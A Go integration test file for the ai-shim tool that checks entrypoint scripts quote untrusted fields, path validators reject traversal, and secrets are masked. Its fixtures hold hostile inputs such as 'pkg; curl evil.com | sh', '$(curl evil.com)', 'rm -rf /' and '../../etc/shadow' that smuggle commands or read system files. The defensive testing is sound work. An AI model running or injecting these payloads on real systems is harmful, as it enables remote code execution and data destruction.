package integration

import (
	"os"
	"path/filepath"
	"strings"
	"testing"

	"github.com/ai-shim/ai-shim/internal/agent"
	"github.com/ai-shim/ai-shim/internal/config"
	"github.com/ai-shim/ai-shim/internal/install"
	"github.com/ai-shim/ai-shim/internal/invocation"
	"github.com/ai-shim/ai-shim/internal/parse"
	"github.com/ai-shim/ai-shim/internal/security"
	"github.com/ai-shim/ai-shim/internal/shell"
	"github.com/stretchr/testify/assert"
	"github.com/stretchr/testify/require"
)

// TestSecurity_ShellInjectionInAgentName verifies that malicious agent names
// are safely quoted in generated entrypoint scripts.
func TestSecurity_ShellInjectionInAgentName(t *testing.T) {
	if testing.Short() {
		t.Skip("skipping in short mode")
	}

	tests := []struct {
		name      string
		agentName string
	}{
		{
			name:      "semicolon_injection",
			agentName: "test; rm -rf /",
		},
		{
			name:      "command_substitution",
			agentName: "test$(whoami)",
		},
		{
			name:      "backtick_execution",
			agentName: "test`id`",
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			script := install.GenerateEntrypoint(install.EntrypointParams{
				InstallType: "npm",
				Package:     "safe-pkg",
				Binary:      "safe-bin",
				AgentName:   tt.agentName,
			})

			// The agent name is embedded in a path that gets shell.Quote'd.
			// Verify the quoted form appears in the script.
			agentDir := "/usr/local/share/ai-shim/agents/" + tt.agentName
			quotedDir := shell.Quote(agentDir)
			assert.Contains(t, script, quotedDir,
				"agent dir path should appear in shell.Quote'd form")
			// The quoted form must start with a single quote (indicating quoting was applied).
			assert.True(t, strings.HasPrefix(quotedDir, "'"),
				"shell.Quote should wrap malicious agent path in single quotes")
		})
	}
}

// TestSecurity_ShellInjectionInPackage verifies that malicious package names
// are safely quoted in generated entrypoint scripts.
func TestSecurity_ShellInjectionInPackage(t *testing.T) {
	if testing.Short() {
		t.Skip("skipping in short mode")
	}

	tests := []struct {
		name string
		pkg  string
	}{
		{
			name: "curl_pipe_injection",
			pkg:  "pkg; curl evil.com | sh",
		},
		{
			name: "newline_injection",
			pkg:  "pkg\nmalicious",
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			script := install.GenerateEntrypoint(install.EntrypointParams{
				InstallType: "npm",
				Package:     tt.pkg,
				Binary:      "safe-bin",
				AgentName:   "safe-agent",
			})

			// The malicious package must appear only in its shell.Quote'd form.
			quoted := shell.Quote(tt.pkg)
			assert.Contains(t, script, quoted,
				"malicious package should appear in shell.Quote'd form")
			assert.True(t, strings.HasPrefix(quoted, "'"),
				"shell.Quote should wrap malicious package in single quotes")
		})
	}
}

// TestSecurity_ShellInjectionInVersion verifies that malicious version strings
// are safely quoted in generated entrypoint scripts.
func TestSecurity_ShellInjectionInVersion(t *testing.T) {
	if testing.Short() {
		t.Skip("skipping in short mode")
	}

	maliciousVersion := "1.0.0; rm -rf /"
	script := install.GenerateEntrypoint(install.EntrypointParams{
		InstallType: "npm",
		Package:     "safe-pkg",
		Binary:      "safe-bin",
		AgentName:   "safe-agent",
		Version:     maliciousVersion,
	})

	// The version is used in INSTALLED_VERSION comparison and npm install.
	// It must be quoted via shell.Quote.
	quoted := shell.Quote(maliciousVersion)
	assert.Contains(t, script, quoted,
		"malicious version should appear in shell.Quote'd form")
	assert.True(t, strings.HasPrefix(quoted, "'"),
		"shell.Quote should wrap malicious version in single quotes")
}

// TestSecurity_PathTraversalInDataDirs verifies that ValidateDataPath
// rejects path traversal and absolute paths, but accepts valid relative paths.
func TestSecurity_PathTraversalInDataDirs(t *testing.T) {
	if testing.Short() {
		t.Skip("skipping in short mode")
	}

	tests := []struct {
		name    string
		path    string
		wantErr bool
	}{
		{"traversal_to_etc_shadow", "../../etc/shadow", true},
		{"absolute_path", "/etc/passwd", true},
		{"bare_dotdot", "..", true},
		{"valid_relative_dotdir", ".normal/dir", false},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			err := agent.ValidateDataPath(tt.path)
			if tt.wantErr {
				assert.Error(t, err, "expected rejection for %q", tt.path)
			} else {
				assert.NoError(t, err, "expected acceptance for %q", tt.path)
			}
		})
	}
}

// TestSecurity_PathTraversalInVolumes verifies that ValidateVolumePath
// rejects sensitive and traversal paths, but accepts safe ones.
func TestSecurity_PathTraversalInVolumes(t *testing.T) {
	if testing.Short() {
		t.Skip("skipping in short mode")
	}

	tests := []struct {
		name    string
		path    string
		wantErr bool
	}{
		{"etc_mount", "/etc", true},
		{"proc_mount", "/proc", true},
		{"var_run_mount", "/var/run", true},
		{"safe_home_mount", "/home/user/code", false},
		{"traversal_to_etc", "/../../../etc", true},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			err := security.ValidateVolumePath(tt.path)
			if tt.wantErr {
				assert.Error(t, err, "expected rejection for %q", tt.path)
			} else {
				assert.NoError(t, err, "expected acceptance for %q", tt.path)
			}
		})
	}
}

// TestSecurity_MaliciousConfigValues verifies that config validation handles
// attack payloads without panicking or accepting invalid profiles.
func TestSecurity_MaliciousConfigValues(t *testing.T) {
	if testing.Short() {
		t.Skip("skipping in short mode")
	}

	t.Run("command_substitution_in_image", func(t *testing.T) {
		cfg := config.Config{
			Image: "$(curl evil.com)",
		}
		// Image validation only checks digest format, not shell safety.
		// This should not panic and should produce no digest warnings
		// since there is no @sha256: in the string.
		warnings := cfg.Validate()
		for _, w := range warnings {
			assert.NotContains(t, w, "panic", "validation should not panic")
		}

		// But if used in an entrypoint, it must be quoted.
		script := install.GenerateEntrypoint(install.EntrypointParams{
			InstallType: "npm",
			Package:     "safe-pkg",
			Binary:      "safe-bin",
			AgentName:   "safe-agent",
		})
		// The image is not directly in the entrypoint, but verify no raw injection.
		assert.NotContains(t, script, "$(curl evil.com)")
	})

	t.Run("semicolon_in_hostname", func(t *testing.T) {
		cfg := config.Config{
			Hostname: "; rm -rf /",
		}
		// Should not panic.
		_ = cfg.Validate()
	})

	t.Run("sql_injection_in_security_profile", func(t *testing.T) {
		cfg := config.Config{
			SecurityProfile: "'; DROP TABLE users; --",
		}
		warnings := cfg.Validate()
		// Should produce a warning about invalid security_profile.
		found := false
		for _, w := range warnings {
			if strings.Contains(w, "invalid security_profile") {
				found = true
				break
			}
		}
		assert.True(t, found, "expected security_profile validation warning, got: %v", warnings)
	})
}

// TestSecurity_SecretMasking verifies that MaskSecrets properly masks
// sensitive environment variable values.
func TestSecurity_SecretMasking(t *testing.T) {
	if testing.Short() {
		t.Skip("skipping in short mode")
	}

	env := map[string]string{
		"ANTHROPIC_API_KEY":     "sk-ant-secret123",
		"NORMAL_VAR":            "normal_value",
		"AWS_SECRET_ACCESS_KEY": "AKIAsomething",
		"DB_PASSWORD":           "hunter2",
	}

	masked := security.MaskSecrets(env)

	assert.Equal(t, "***", masked["ANTHROPIC_API_KEY"],
		"ANTHROPIC_API_KEY should be masked (sensitive key name + sk-ant- prefix)")
	assert.Equal(t, "normal_value", masked["NORMAL_VAR"],
		"NORMAL_VAR should not be masked")
	assert.Equal(t, "***", masked["AWS_SECRET_ACCESS_KEY"],
		"AWS_SECRET_ACCESS_KEY should be masked (contains SECRET and KEY)")
	assert.Equal(t, "***", masked["DB_PASSWORD"],
		"DB_PASSWORD should be masked (contains PASSWORD)")
}

// TestSecurity_MaliciousAgentYAML verifies that LoadCustomAgents handles
// agent definitions with injection attempts in their fields.
func TestSecurity_MaliciousAgentYAML(t *testing.T) {
	if testing.Short() {
		t.Skip("skipping in short mode")
	}

	// Create a temp config directory with a malicious agent YAML.
	configDir := t.TempDir()
	agentsDir := filepath.Join(configDir, "agents")
	require.NoError(t, os.MkdirAll(agentsDir, 0o755))

	yamlContent := `agent_def:
  install_type: npm
  package: "evil-pkg; curl evil.com | sh\nrm -rf /"
  binary: "safe-bin"
  data_dirs:
    - "../../etc/shadow"
    - ".normal/dir"
    - "/etc/passwd"
`
	require.NoError(t, os.WriteFile(
		filepath.Join(agentsDir, "malicious.yaml"),
		[]byte(yamlContent),
		0o644,
	))

	agents := agent.LoadCustomAgents(configDir)
	require.NotNil(t, agents, "should load the agent despite malicious fields")

	def, ok := agents["malicious"]
	require.True(t, ok, "malicious agent should be present")

	// The package field is stored as-is (quoting happens at entrypoint generation).
	assert.Contains(t, def.Package, "evil-pkg",
		"package should be loaded as-is from YAML")

	// But malicious data_dirs should have been filtered out by ValidateDataPath.
	for _, d := range def.DataDirs {
		assert.NotContains(t, d, "..", "traversal paths should be filtered out")
		assert.False(t, filepath.IsAbs(d), "absolute paths should be filtered out")
	}
	assert.Contains(t, def.DataDirs, ".normal/dir",
		"valid data dir should be preserved")

	// Now verify that the malicious package is quoted when generating entrypoint.
	script := install.GenerateEntrypoint(install.EntrypointParams{
		InstallType: def.InstallType,
		Package:     def.Package,
		Binary:      def.Binary,
		AgentName:   "malicious",
	})
	// The malicious package must appear in its shell.Quote'd form.
	quoted := shell.Quote(def.Package)
	assert.Contains(t, script, quoted,
		"malicious package should appear in shell.Quote'd form in entrypoint")
	assert.True(t, strings.HasPrefix(quoted, "'"),
		"shell.Quote should wrap malicious package in single quotes")
}

// TestSecurity_ImageDigestValidation verifies that image digest validation
// correctly rejects invalid digests and accepts valid ones.
func TestSecurity_ImageDigestValidation(t *testing.T) {
	if testing.Short() {
		t.Skip("skipping in short mode")
	}

	tests := []struct {
		name    string
		image   string
		wantErr bool
	}{
		{
			name:    "too_short_digest",
			image:   "image@sha256:abc",
			wantErr: true,
		},
		{
			name:    "valid_64_hex_digest",
			image:   "image@sha256:" + strings.Repeat("a", 64),
			wantErr: false,
		},
		{
			name:    "non_hex_chars_in_digest",
			image:   "image@sha256:" + strings.Repeat("g", 64),
			wantErr: true,
		},
		{
			name:    "tag_only_no_digest",
			image:   "image:tag",
			wantErr: false,
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			err := parse.ImageDigest(tt.image)
			if tt.wantErr {
				assert.Error(t, err, "expected error for %q", tt.image)
			} else {
				assert.NoError(t, err, "expected no error for %q", tt.image)
			}
		})
	}
}

// TestSecurity_InvocationNameInjection verifies that ParseName rejects
// adversarial symlink names (path traversal, shell metacharacters) before
// they can reach the filesystem or container runtime.
func TestSecurity_InvocationNameInjection(t *testing.T) {
	if testing.Short() {
		t.Skip("skipping in short mode")
	}

	tests := []struct {
		name      string
		input     string
		wantErr   bool
		wantAgent string
	}{
		{
			name:    "empty_string",
			input:   "",
			wantErr: true,
		},
		{
			name:    "underscore_only",
			input:   "_",
			wantErr: true,
		},
		{
			name:    "path_traversal",
			input:   "../../../etc/passwd",
			wantErr: true, // ValidateAgentName rejects '/' and leading '.'
		},
		{
			name:    "semicolon_in_name",
			input:   "agent; rm -rf /",
			wantErr: true, // ValidateAgentName rejects ';', ' ', '/'
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			agentName, _, err := invocation.ParseName(tt.input)
			if tt.wantErr {
				assert.Error(t, err, "expected error for %q", tt.input)
			} else {
				assert.NoError(t, err, "expected no error for %q", tt.input)
				assert.Equal(t, tt.wantAgent, agentName)
			}
		})
	}
}
